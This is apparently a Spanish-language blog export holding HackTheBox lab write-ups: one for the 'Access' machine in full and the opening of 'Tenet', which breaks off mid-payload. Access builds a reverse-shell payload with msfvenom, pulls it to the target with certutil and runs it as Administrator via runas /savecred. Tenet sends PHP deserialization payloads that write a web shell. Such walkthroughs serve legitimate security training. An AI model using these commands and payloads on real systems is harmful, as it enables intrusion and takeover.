  Enumeraci√≥n puerto 21 (FTP).     Explotaci√≥n.      Acceso al sistema como el usuario security.     Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: ‚Ä¶ Enumeraci√≥n de puertos con nmap ‚åñ: Vamos a empezar con un escaneo de puertos apoy√°ndonos de nmap, as√≠ vamos descubriendo por donde tirar: ‚ù± nmap -p- --open -v 10. 10. 10. 98 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   Nos responde: ‚ù± cat initScan# Nmap 7. 80 scan initiated Thu Jun 10 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 98# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 98 () Status: UpHost: 10. 10. 10. 98 () Ports: 21/open/tcp//ftp///, 23/open/tcp//telnet///, 80/open/tcp//http/// Ignored State: filtered (65532)# Nmap done at Thu Jun 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 197. 46 seconds      Puerto   Descripci√≥n         21   FTP       23   Telnet       80   HTTP   ~(Para copiar los puertos directamente en la clipboard, hacemos uso de la funci√≥n referenciada antes ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 98  [*] Open ports: 21,23,80[*] Ports copied to clipboard)~ Ahora teniendo los puertos activos de la m√°quina, hagamos un escaneo de versiones y scripts conocidos para cada puerto, as√≠ podremos identificar cositas relevantes en cada uno: ‚ù± nmap -p 21,23,80 -sC -sV 10. 10. 10. 98 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   El escaneo nos responde: # Nmap 7. 80 scan initiated Thu Jun 10 25:25:25 2021 as: nmap -p 21,23,80 -sC -sV -oN portScan 10. 10. 10. 98Nmap scan report for 10. 10. 10. 98Host is up (0. 11s latency). PORT  STATE SERVICE VERSION21/tcp open ftp   Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can't get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT23/tcp open telnet?80/tcp open http  Microsoft IIS httpd 7. 5| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7. 5|_http-title: MegaCorpService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Thu Jun 10 25:25:25 2021 -- 1 IP address (1 host up) scanned in 184. 58 secondsPodemos destacar:       Puerto   Servicio   Versi√≥n         21   FTP   Microsoft ftpd       80   HTTP   Microsoft IIS httpd 7. 5    Adem√°s que tenemos acceso al servicio FTP con las credenciales anonymous. Pues nada, a explorar y romper esta machina :P ‚Ä¶ Puerto 21 - FTP ‚åñ: En el escaneo de nmap nos percatamos que tenemos habilitado el acceso an√≥nimo al servidor FTP, pues entremos, colocamos como usuario y contrase√±a anonymous: ‚ù± ftp 10. 10. 10. 98Connected to 10. 10. 10. 98. 220 Microsoft FTP ServiceName (10. 10. 10. 98:root): anonymous331 Anonymous access allowed, send identity (e-mail name) as password.  Password:230 User logged in. Remote system type is Windows_NT. ftp&gt; Listo, tamos dentro, recorramos a ver si hay algo interesante: ftp&gt; dir200 PORT command successful. 125 Data connection already open; Transfer starting.  08-23-18 09:16PM    &lt;DIR&gt;     Backups08-24-18 10:00PM    &lt;DIR&gt;     Engineer226 Transfer complete. ftp&gt; Dos directorios, veamos Backups primero: ftp&gt; cd Backups250 CWD command successful. ftp&gt; dir200 PORT command successful. 125 Data connection already open; Transfer starting.  08-23-18 09:16PM       5652480 backup. mdb226 Transfer complete. ftp&gt; Encontramos un objeto . mdb, que investigando se trata de un archivo de bases de datos Microsoft Access:  Estos archivos est√°n clasificados como archivos de bases de datos, ya que en su mayor√≠a contienen la estructura de bases de datos, las entradas y las formas, las consultas, los informes, la configuraci√≥n de la seguridad de base de datos‚Ä¶ Pues descargu√©moslo a nuestro sistema y sigamos enumerando la otra carpeta: ftp&gt; binary200 Type set to I. ftp&gt; get backup. mdblocal: backup. mdb remote: backup. mdb200 PORT command successful. 150 Opening BINARY mode data connection. 226 Transfer complete. 5652480 bytes received in 13. 14 secs (419. 9918 kB/s) ftp&gt; ‚ù± file backup. mdb backup. mdb: Microsoft Access DatabaseBien, veamos Engineer: ftp&gt; cd Engineer250 CWD command successful. ftp&gt; dir200 PORT command successful. 125 Data connection already open; Transfer starting. 08-24-18 01:16AM        10870 Access Control. zip226 Transfer complete. ftp&gt; Un archivo comprimido, descargu√©moslo: ftp&gt; get  Access Control. zip ‚ù± file Access\ Control. zip Access Control. zip: Zip archive data, at least v2. 0 to extract‚Ä¶ Pues juguemos con el archivo de bases de datos‚Ä¶ Apoy√°ndonos en una consulta web, encontramos un foro con algunos recursos para ver la data del archivo:  DBeaver.  www. mdbopener. com. Cualquiera de las dos nos viene bien, adem√°s que podemos complementarlas: Usando la web: Cargamos el archivo, esperamos un rato y obtenemos: N√≥tese a toda la derecha que hay muchas tablas :P Pero lo lindo de esta interfaz es que nos indica cu√°l de ellas tiene informaci√≥n dentro (# Rows), as√≠ no tenemos que ir mirando una a una. Veamos r√°pidamente la otra alternativa: Usando DBeaver: Despues de instalar el programa (siguiendo el foro, no es necesario ejecutar apt install -f) lo ejecutamos en segundo plano, as√≠ lo desligamos de la consola y evitamos que la use: ‚ù± (dbeaver &gt;&amp; /dev/null &amp;)Est√° linda la herramienta porque podemos jugar con much√≠simas bases de datos: Encontramos la relacionada con Microsoft Access, la seleccionamos y nos pedir√° un path, ah√≠ le pasamos la ruta donde est√° el archivo . mdb y damos clic en Finalizar, deber√≠amos terminar en esta ventana: Ahora damos clic donde se√±ale, pueda que les pida algo de descargar, si si, pues le dan a descargar ü•≥ y si no pues supongo que todo ira bien u. u üò± Finalmente deber√≠amos tener esto: Y listo, ver√≠amos todas las tablas, pero pues deber√≠amos ir una a una viendo cu√°l tiene data, lo cual est√° aburrido :P Peeeero en esta interfaz podemos agregar consultas SQL, por eso digo que se complementan, en una vamos directamente a donde hay informaci√≥n y en la otra filtramos esa informaci√≥n en caso de ser necesario. As√≠ que las dos herramientas est√°n guapetonas. Explorando las tablas encontramos algunas llamativas‚Ä¶ USERINFO: Que en su contenido tiene varios campos, pero filtrando por los destacables tenemos: Unos ‚Äúusuarios‚Äù (son nombres, pero podemos pensar en ellos como usuarios tambi√©n) con contrase√±as‚Ä¶ auth user: Encontramos otras credenciales, pero esta vez m√°s directas e. e Tenemos usuarios y contrase√±as, aunque una destaca (al ser distinta de las otras) ¬øcu√°l ser√°? e. e üò¨ ‚Ä¶ Explotaci√≥n #: Tenemos unas credenciales, guard√©moslas y terminemos de enumerar lo obtenido del servidor FTP, veamos el comprimido: ‚ù± unzip Access\ Control. zip Archive: Access Control. zip  skipping: Access Control. pst   unsupported compression method 99Jmmm, nos muestra que tiene contenido (un archivo . pst) pero no nos deja obtenerlo, validemos con la herramienta 7z ((de)compresor universal) si es necesaria una contrase√±a para descomprimir el objeto: ‚ù± 7z x Access\ Control. zip . . . Enter password (will not be echoed):ERROR: Wrong password : Access Control. pst . . . Sub items Errors: 1Y si, ese es el error, nos pide contrase√±a. Pues aprovechando que tenemos credenciales prob√©moslas contra el comprimido‚Ä¶ Probando la que hab√≠amos dicho que era distinta a las dem√°s (access4u@security) conseguimos descomprimir el objeto sin problemas: ‚ù± 7z x Access\ Control. zip . . . Enter password (will not be echoed): Everything is Ok     Size:    271360Compressed: 10870Bien, obtenemos el archivo . pst: ‚ù± file Access\ Control. pst Access Control. pst: Microsoft Outlook email folder (&gt;=2003)Un objeto . pst objeto que contiene mensajes y otros items relacionados con Outlook, pero para poder leer ese objeto es necesario convertirlo a formato ‚Äúreadable‚Äù, usaremos readpst para ese prop√≥sito: ‚ù± readpst Access\ Control. pst Opening PST file and indexes. . . Processing Folder  Deleted Items      Access Control  - 2 items done, 0 items skipped. El archivo contiene el directorio Deleted Items y ha recuperado 2 items de √©l, esa informaci√≥n la guarda en un archivo . mbox con formato entendible: ‚ù± ls'Access Control. mbox' 'Access Control. pst' 'Access Control. zip'  backup. mdbViendo su contenido encontramos: ‚ù± cat Access\ Control. mbox Opa, varias cositas destacadas:  john@megacorp. com, un usuario (john, que lo hab√≠amos visto antes) y un dominio (que no creo que sea relevante, ya que es . com).  security@accesscontrolsystems. com, otro usuario y otro dominio extra√±o.  Nos confirman una cuenta llamada security y una contrase√±a asignada a ella:     4Cc3ssC0ntr0ller.    Bien, pues varias credenciales para probar üèúÔ∏è ‚Ä¶ Puerto 23 - Telnet ‚åñ: El servicio telnet nos ayuda a establecer conexiones remotas con otros ordenadores, as√≠ de sencillo, algo as√≠ como SSH, pero telnet es inseguro :P Usando la herramienta telnet podemos empezar a jugar: ‚ù± telnet 10. 10. 10. 98. . . Welcome to Microsoft Telnet Service login: adminpassword: The handle is invalid. Login FailedEfectivamente nos pide unas credenciales, pues probando las que conseguimos del correo obtenemos: Peeeeeeeeeerrrrrrrrrrrrfecto, estamos dentro del sistema como el usuario security :o ‚Ä¶ Escalada de privilegios #: Enumerando el sistema encontramos una carpeta llamada ZKTeco, que usualmente no la vemos en un sistema Windows, as√≠ que es llamativa: c:\&gt;dir Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of c:\08/23/2018 11:05 PM  &lt;DIR&gt;     inetpub07/14/2009 04:20 AM  &lt;DIR&gt;     PerfLogs08/23/2018 09:53 PM  &lt;DIR&gt;     Program Files08/24/2018 08:40 PM  &lt;DIR&gt;     Program Files (x86)08/24/2018 08:39 PM  &lt;DIR&gt;     temp08/21/2018 11:31 PM  &lt;DIR&gt;     Users08/23/2018 11:40 PM  &lt;DIR&gt;     Windows08/22/2018 08:23 AM  &lt;DIR&gt;     ZKTeco        0 File(s)       0 bytes        8 Dir(s) 16,771,743,744 bytes freec:\&gt;c:\&gt;dir ZKTeco Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of c:\ZKTeco08/22/2018 08:23 AM  &lt;DIR&gt;     . 08/22/2018 08:23 AM  &lt;DIR&gt;     . . 06/11/2021 04:40 PM  &lt;DIR&gt;     ZKAccess3. 5        0 File(s)       0 bytes        3 Dir(s) 16,771,743,744 bytes freec:\&gt;Al parecer contiene un software llamado ZKAccess3. 5, que sirve para administrar el control de acceso al sistema‚Ä¶ Dentro del directorio hay varios archivos, pero ninguno interesante ): Buscando vulnerabilidades relacionadas, encontramos esta, pero no es funcional ‚òπÔ∏è Despues de enumerar m√°s a fondo, encontramos un archivo relacionado con el servicio ZKAccess en el directorio C:\Users\Public\Desktop: (Debemos listar todo, hasta archivos ocultos) Normal: c:\Users\Public&gt;dir Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of c:\Users\Public07/14/2009 05:57 AM  &lt;DIR&gt;     . 07/14/2009 05:57 AM  &lt;DIR&gt;     . . 07/14/2009 06:06 AM  &lt;DIR&gt;     Documents07/14/2009 05:57 AM  &lt;DIR&gt;     Downloads07/14/2009 05:57 AM  &lt;DIR&gt;     Music07/14/2009 05:57 AM  &lt;DIR&gt;     Pictures07/14/2009 05:57 AM  &lt;DIR&gt;     Videos        0 File(s)       0 bytes        7 Dir(s) 16,771,743,744 bytes freec:\Users\Public&gt;Normal m√°s ocultos: c:\Users\Public&gt;dir /a Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of c:\Users\Public07/14/2009 05:57 AM  &lt;DIR&gt;     . 07/14/2009 05:57 AM  &lt;DIR&gt;     . . 08/28/2018 07:51 AM  &lt;DIR&gt;     Desktop07/14/2009 05:57 AM        174 desktop. ini07/14/2009 06:06 AM  &lt;DIR&gt;     Documents07/14/2009 05:57 AM  &lt;DIR&gt;     Downloads07/14/2009 03:34 AM  &lt;DIR&gt;     Favorites07/14/2009 05:57 AM  &lt;DIR&gt;     Libraries07/14/2009 05:57 AM  &lt;DIR&gt;     Music07/14/2009 05:57 AM  &lt;DIR&gt;     Pictures07/14/2009 05:57 AM  &lt;DIR&gt;     Videos        1 File(s)      174 bytes       10 Dir(s) 16,771,743,744 bytes freec:\Users\Public&gt;Y en el directorio Desktop tenemos: c:\Users\Public&gt;cd Desktopc:\Users\Public\Desktop&gt;dir Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of c:\Users\Public\Desktop08/22/2018 10:18 PM       1,870 ZKAccess3. 5 Security System. lnk        1 File(s)     1,870 bytes        0 Dir(s) 16,771,743,744 bytes freec:\Users\Public\Desktop&gt;Veamos su contenido: Encontramos una instrucci√≥n, que se ejecuta cada vez que se llame al archivo . lnk. Romp√°mosla y entendamos que est√° haciendo r√°pidamente:  . . \. . \. . \Windows\System32\runas. exe: Llama al programa [runas. exe], el cual sirve como m√©todo de ejecutar comandos o tareas como otros usuarios.  C:\ZKTeco\ZKAccess3. 5: En la l√≥gica de la instrucci√≥n esto no har√≠a nada y se habr√≠a mezclado en el output del . lnk (o sea, esto no hace nada, lo obviaremos).  /user:ACCESS\Administrator: El usuario con el que se ejecutara el proceso.  /savecred: Es usado para que no solicite la contrase√±a todas las veces que se ejecute el . lnk, la pedir√° la primera vez, pero ya despues no.   C:\ZKTeco\ZKAccess3. 5\Access. exe : Es el proceso que ejecuta el binario runas. exe como usuario Administrator al ‚Äúejecutar‚Äù el archivo . lnk. As√≠ que lo que se estar√≠a ejecutando seria: runas. exe /user:ACCESS\Administrator /savecred  C:\ZKTeco\ZKAccess3. 5\Access. exe Validando si esa l√≠nea est√° haciendo algo, no encontr√© alg√∫n cambio, pero podemos probar el funcionamiento de /savecred: Nos pide contrase√±a: c:\Users\Public\Desktop&gt;runas. exe /user:ACCESS\Administrator  C:\ZKTeco\ZKAccess3. 5\Access. exe  Enter the password for ACCESS\Administrator: nosabo:(c:\Users\Public\Desktop&gt;No nos pide contrase√±a: c:\Users\Public\Desktop&gt;runas. exe /user:ACCESS\Administrator /savecred  C:\ZKTeco\ZKAccess3. 5\Access. exe  c:\Users\Public\Desktop&gt;As√≠ que probablemente est√° ejecutando algo con el binario Access. exe y no nos da problemas‚Ä¶ ‚Ä¶  runas: Nos permite lanzar programas (tanto propios como del sistema operativo) y archivos por lotes en nombre de otro usuario. Es decir, como usuario ‚Äúx‚Äù lanzaremos un comando como usuario ‚Äúy‚Äù sin necesidad de iniciar sesi√≥n en el equipo con ‚Äúy‚Äù. Ejemplo de uso comando runas. exe en Windows.  Otro recurso: RunAs. exe en Windows. Pues perfecto, usemos esa propia l√≠nea, pero en vez de ejecutar el binario Access. exe intentemos ejecutar un payload que contenga una Reverse Shell, as√≠ obtendr√≠amos una Shell como el usuario Administrator (ya que todo lo que ejecutemos se ejecutar√≠a como √©l), gener√©moslo con ayuda de msfvenom: ‚ù± msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 14. 16 LPORT=4434 -f exe -o averque. exeEntonces, cuando haga la petici√≥n hacia el LHOST por el LPORT generara una shell_reverse_tcp (una terminal normalita de toda la vida). Lo guardamos con formato . exe y que se llame averque. exe. Pong√°monos en escucha tanto en el puerto 4434 como en un servidor web para poder subir el archivo: ‚ù± nc -lvp 4434listening on [any] 4434 . . . ‚ù± python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Ahora s√≠, juguemos con certutil. exe: C:\Users\security\Videos&gt;certutil. exe -f -urlcache -split http://10. 10. 14. 16:8000/averque. exe c:\Users\security\Videos\averque. exeC:\Users\security\Videos&gt;dir Volume in drive C has no label. Volume Serial Number is 9C45-DBF0 Directory of C:\Users\security\Videos06/11/2021 25:25 PM  &lt;DIR&gt;     . 06/11/2021 25:25 PM  &lt;DIR&gt;     . . 06/11/2021 25:25 PM      73,802 averque. exe        2 File(s)    147,604 bytes        2 Dir(s) 16,771,743,744 bytes freeC:\Users\security\Videos&gt;Y ahora ejecutamos el binario con la ayuda de runas y las credenciales que tenemos (guardadas): C:\Users\security\Videos&gt;runas. exe /user:ACCESS\Administrator /savecred  C:\Users\security\Videos\averque. exe  Y en nuestro listeneeeeeeeeeeer: Y siiiiiiiii, tamos dentro del sistema como el usuario Administrator ‚õ±Ô∏è Solo nos quedar√≠a ver las flags: ‚Ä¶ Bonito camino, movimientos con FTP bastante divertidos, vista amplia y pensamiento lateral. Muchas gracias por leer yyyyyyyyyyyyyyyyyyy A R O M P E R T O D O ! "
    }, {
    "id": 43,
    "url": "http://localhost:4000/htb/tenet",
    "title": "HackTheBox - Tenet",
    "body": "2021/06/12 - M√°quina Linux nivel medio. Exploraremos deserializaci√≥n insegura de objetos en PHP, reutilizaci√≥n de contrase√±as y encontraremos peque√±os fallos en scripts de bash :P TL;DR (Spanish writeup): Creada por: egotisticalSW. Bueno bueno bu e nooo ooo ¬øC√≥mo est√°s? Nos encontraremos con una p√°gina web montada sobre wordpress, daremos algunas vueltas y despues de estar perdidos (como raro :P) encontramos dos archivos interesantes: sator. php y sator. php. bak. Nos aprovecharemos que podemos ver el c√≥digo fuente para entender que podemos explotar una vulnerabilidad llamada inyecci√≥n de objetos PHP. La usaremos para conseguir una sesi√≥n como www-data.  Script para ejecutar cualquier comando en la m√°quina mediante la deserializaci√≥n insegura. Enumerando tendremos unas credenciales del usuario neil hacia la base de datos mysql, con las mismas credenciales lograremos obtener una sesi√≥n como el usuario neil. Tambi√©n enumerando (en la anterior tambi√©n nos percat√°bamos de esto) encontramos un script que puede ser ejecutado como usuario administrador. Observando su fuente notaremos que podemos manipular el proceso, incluiremos nuestra llave p√∫blica al archivo authorized_keys del usuario root. Con esto conseguiremos una sesi√≥n como el usuario root. Clasificaci√≥n de la m√°quina: Tendremos que movernos bastante, lo cual est√° perfecto :) Pero la m√°quina es muy poco realista :(  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto). ‚Ä¶ ¬øQu√© haremos?  Enumeraci√≥n Explotaci√≥n Escalada de privilegios‚Ä¶ Enumeraci√≥n #: Realizaremos un escaneo de puertos para saber que servicios est√° corriendo la m√°quina. ‚Äì¬ª nmap -p- --open -v 10. 10. 10. 223 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Sun Jan 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 223# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 223 ()  Status: UpHost: 10. 10. 10. 223 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Sun Jan 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 86. 68 secondsPerfecto, tenemos:       Puerto   Descripci√≥n         22   SSH: Conexi√≥n remota segura mediante una Shell       80   HTTP: Protocolo que permite la comunicaci√≥n y transferencia de info a trav√©s de la web   Hagamos nuestro escaneo de scripts y versiones con base en cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio: ‚Äì¬ª nmap -p 22,80 -sC -sV 10. 10. 10. 223 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Sun Jan 17 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 223Nmap scan report for 10. 10. 10. 223Host is up (0. 19s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)|  256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)|_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Sun Jan 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 14. 20 secondsObtenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 6p1 Ubuntu 4       80   HTTP   Apache httpd 2. 4. 29   Pues d√©mosle a cada servicio y veamos que podemos romper (: ‚Ä¶ En cuanto al puerto 22 y su versi√≥n OpenSSH 7. 6, lo √∫nico que podemos hacer es enumeraci√≥n de usuarios en concreto, pero por el momento no tenemos ninguno, as√≠ que sigamos‚Ä¶ Puerto 80 ‚åñ: Nos muestra la p√°gina por defecto de Apache‚Ä¶ Us√©mosla para hacer algo de fuzzing, en este caso antes de usar dirsearch o wfuzz, emplear√© un script de nmap que nos dar√° una visi√≥n r√°pida por si hay algo interesante: ‚Äì¬ª nmap -p 80 --script http-enum 10. 10. 10. 223 -oN webScanStarting Nmap 7. 80 ( https://nmap. org ) at 2021-01-17 25:25 -25Nmap scan report for 10. 10. 10. 223Host is up (0. 19s latency). PORT  STATE SERVICE80/tcp open http| http-enum: |_ /wordpress/wp-login. php: Wordpress login page. Nmap done: 1 IP address (1 host up) scanned in 19. 79 secondsOpa, tenemos una ruta, veamos su contenido: Algo feito‚Ä¶ Lo interesante es que nos permite ir de vuelta a tenet, que si revisamos hac√≠a que URL nos lleva: . . . &lt;p id= backtoblog &gt;&lt;a href= http://tenet. htb/ &gt;&amp;larr; Go to Tenet&lt;/a&gt;&lt;/p&gt;. . . Agregu√©mosla al archivo /etc/hosts y validemos http://tenet. htb. ‚Äì¬ª cat /etc/hosts. . . 10. 10. 10. 223 tenet. htb. . . Tenemos 3 art√≠culos, uno sobre la b√∫squeda de nuevos talentos :P, otro sobre una migraci√≥n de informaci√≥n que est√°n haciendo y otro sobre un nuevo release, revisando cada uno, el de la migraci√≥n tiene algo interesante:  Habla sobre un sator php file, una b√∫squeda r√°pida me direcciono: Hay dos se√±ales de que por ac√° debe ser el camino, Tenet est√° grabado en los cuadros y el logo de la m√°quina es el mismo que el cuadro, as√≠ que s√≠, debe ser por ac√°‚Ä¶ Muy real no es pero est√° divertido :P  Cuadrado Sator: Cuadrado m√°gico compuesto por cinco palabras latinas: SATOR, AREPO, TENET, OPERA, ROTAS, que, consideradas en conjunto, dan lugar a un multipal√≠ndromo (Frases que se leen igual desde el lado izquierdo al derecho que en sentido contrario). Wikipedia‚Ä¶ Me parecio interesante, sigamos. ‚Ä¶ As√≠ que entiendo que debemos encontrar el archivo sator. php (?), o quiz√°s su backup sator. php. bak (?). Estoy adivinando a que puedan ser esos nombres, pero no lo podemos saber hasta encontrarlos, no? Llevo bastante rato perdido, no encuentro nadaaaaaaaaaaaaaa. (Si, hablando en presente :P) Tuve que pedir ayuda al que nunca falla, @TazWake y ay noooo, era lo m√°s sencillo del mundo, pero pues estaba tan cerrado en encontrarlo que no lo pens√©. Si revisamos la IP del dominio tenet. htb, o sea la 10. 10. 10. 223 y buscamos ah√≠ los archivos‚Ä¶ Pues si, sencillamente los encontramos üòÄ üôÉ üòê üòî Y si apuntamos al backup (sator. php. bak), nos permite descargar el archivo‚Ä¶ &lt;?phpclass DatabaseExport{ public $user_file = 'users. txt'; public $data = ''; public function update_db() {  echo '[+] Grabbing users from text file &lt;br&gt;';  $this-&gt; data = 'Success'; } public function __destruct() {  file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);  echo '[] Database updated &lt;br&gt;';  echo 'Gotta get this working properly. . . '; }}$input = $_GET['arepo'] ?? '';$databaseupdate = unserialize($input);$app = new DatabaseExport;$app -&gt; update_db();?&gt;Algo que me llamo la atenci√≥n de inmediato fue la funci√≥n unserialize, puesto que he experimentado con vulnerabilidades al serializar o deserializar un objeto. As√≠ que despues de buscar por internet de que se trataba y si era peligroso su uso, tenemos varias cositas interesantes: ‚Ä¶ Explotaci√≥n #: Se viene mucho texto :) ‚Ä¶  Excelente articulo: Exploiting PHP deserialization - medium. com/(vickie li). ‚Ä¶ Explicando concepto de deserializaci√≥n: En pocas palabras (pocas realmente, √©chenle un ojo por su parte, es super interesante). La deserializaci√≥n es pasar un conjunto de bytes que viaja por la red a un √∫nico objeto. (La serializaci√≥n ser√≠a lo contrario). El problema de esto es que mientras se efect√∫a la conversi√≥n/transformaci√≥n, siempre depende de la sanitizaci√≥n con la que se cuente, se pueden inyectar comandos que si o si, se ejecutar√°n en el proceso, donde si llegase a fallar por X o Y motivo, no nos importar√≠a, ya que el intento de serializaci√≥n/deserializaci√≥n se hizo, por lo tanto tambi√©n nuestro exploit. Algo m√°s de info:  Deserializaci√≥n insegura - seguridad-ofensiva. com/OWASP-Top-10.  PHP Object Injection Cheat Sheet - nitesculucian. github. io.  Insecure Deserialization PHP - github. com/PayloadsAllTheThings.  PHP object injection - tarlogin. com. En nuestro caso tratamos con una deserializaci√≥n en PHP, enfoqu√©monos en el c√≥digo del archivo sator. php: 1. Recibe las peticiones GET mediante el argumento arepo y lo guarda en la variable input para posteriormente hacer la respectiva deserializacion de ella (viene lo lindo). 2. Guarda la deserializaci√≥n en otra variable y no hace nada con ella. Ahora genera un nuevo objeto para simplemente imprimir [+] Grabbing users from text file en la web. (Lo vimos en la imagen anterior) 3. Lo ¬´lindo¬ª es que en todos los art√≠culos que hablan sobre PHP serialize/unserialize object injection tocan dos √≠tems necesarios para poder aprovecharnos del proceso:  Ac√° tocan que obviamente tengamos la manera de manipular la data que se va a deserializar. En nuestro caso tenemos el argumento arepo, as√≠ que bien.  El uso de un m√©todo m√°gico (B√°sicamente m√©todos para llevar a cabo ciertas tareas, mucha m√°s info ac√°).      Nosotros tenemos el m√©todo __destruct() que borra cualquier referencia en base al objeto creado.     Donde siempre que se llame a la funci√≥n unserialize se llamara tambi√©n al m√©todo. (Por eso tambi√©n ve√≠amos en la imagen el texto [] Database updated, no s√© por qu√© el otro texto no se muestra, pero bueno, se entiendo el punto. 4. Finalmente toma el contenido de la variable user_file (en este caso users. txt) y le guarda el contenido ahora de la variable data (en este caso '' (vac√≠o por si no se entiende :P)). Todo mediante la funci√≥n file_put_contents. Eso es lo que hace el archivo, pero ¬øc√≥mo podemos finalmente aprovecharnos de esto? Bueno despues de algo de prueba y error y de encontrar este art√≠culo, realmente entend√≠ la explotaci√≥n: Pero antes, una aclaraci√≥n :P el articulo simplemente me ayudo a obtener un output (que ni supuse me iba a dar) con el que estaba lidiando en mi cabeza antes de encontrarlo:  PHP unserialize object injection . . wordpress - dannewitz. ninjaEl articulo cita este trozo de codigo, el cual me parecio interesante:  $logger = new Logger('exploit. php', '&lt;?php exec($_GET[ paul ]) ?&gt;');echo htmlspecialchars(urlencode(serialize($logger)));Que planeaba usar para que me generara un archivo (exploit. php) obteniendo el objeto serializado para enviarlo mediante una petici√≥n GET. Asi que lo agregue al objeto sator. php. bak y lo ejecute: . . . $app -&gt; update_db();echo  ------ ;$logger = new DatabaseExport('expl. php', '&lt;?php exec($_GET[ paul ]) ?&gt;');echo htmlspecialchars(urlencode(serialize($logger)));echo  ------ ;?&gt;‚Äì¬ª php sator. php. bak[+] Grabbing users from text file &lt;br&gt;------O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22users. txt%22%3Bs%3A4%3A%22data%22%3Bs%3A0%3A%22%22%3B%7D------[] Database updated &lt;br&gt;Gotta get this working properly. . . [] Database updated &lt;br&gt;Gotta get this working properly. . . Nos genera la cadena en formato URL encode. Hagamos un Decode: O:14: DatabaseExport :2:{s:9: user_file ;s:9: users. txt ;s:4: data ;s:0:  ;}Asi es como viaja la data del objeto serializado, hay mas items pero en la cadena que tenemos nosotros contamos con: (Vuelvo a citar el gran articulo de Vickie Li).       Argumento   Descripci√≥n         O   Representa un objeto llamado DatabaseExport (la longitud de la cadena es 14) y que tiene 2 propiedades, la primera propiedad:       s   Representa una string de 9 caracteres llamada user_file       s   Representa una string de 9 caracteres llamada users. txt y la segunda propiedad:       s   Representa una string de 4 caracteres llamada data       s   Representa una string de 0 caracteres llamada ``   Perfecto, esto de una me hizo pensar en el archivo users. txt y que probablemente este creado en la raiz de la web, conteniendo Success (como nos lo indica el codigo de sator. php. bak).  Opa, jmmm interesante. Despues de pensar y probar algunas cosas me llego una idea‚Ä¶ Yo no podria modificar el contenido del archivo users. txt? Pues probemos, para esto us√© BurpSuite: /sator. php?arepo=O:14: DatabaseExport :2:{s:9: user_file ;s:9: users. txt ;s:4: data ;s:6: holaa? ;} Damos Send y ahora revisamos el archivo users. txt: Nice, nice, niceeeeeeeeeeeeeeeeeeee. Pero con un archivo . txt, que podemos explotar‚Ä¶ Jmmmm, entonces tambi√©n pens√© en si se podr√≠a crear un archivo que no fuera users. txt (?) Ve√°moslo: /sator. php?arepo=O:14: DatabaseExport :2:{s:9: user_file ;s:16: ajaTEncontre. php ;s:4: data ;s:23: &lt;?php echo 'holaa?'; ?&gt; ;}Encode URL: /sator. php?arepo=O:14: DatabaseExport 